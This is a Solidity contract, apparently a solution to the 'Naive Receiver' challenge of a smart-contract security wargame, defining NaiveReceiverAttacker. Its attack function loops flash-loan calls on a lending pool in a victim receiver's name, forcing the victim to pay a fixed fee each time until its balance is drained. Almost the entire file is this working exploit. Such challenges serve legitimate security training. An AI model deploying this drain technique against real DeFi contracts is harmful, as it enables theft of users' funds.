// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface LenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    using Address for address;

    address payable public pool;
    address payable public target;
    LenderPool poolContract;

    uint256 private constant FIXED_FEE = 10 ether;

    constructor(address payable _target, address payable _pool) {
        pool = _pool;
        target = _target;
        poolContract = LenderPool(_pool);
    }

    // function receiveEther(uint256 fee) public payable {
    //     console.log("FROM CONTRACT::: Calling: ");
    //     (bool success, bytes memory data) = target.delegatecall(
    //         abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE)
    //     );
    //     console.log("FROM CONTRACT::: Result: ", success);
    // }

    function attack(address _pool, address _target) public {
        while (_target.balance > 0) {
            _pool.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    _target,
                    uint256(1)
                )
            );
        }
    }
}
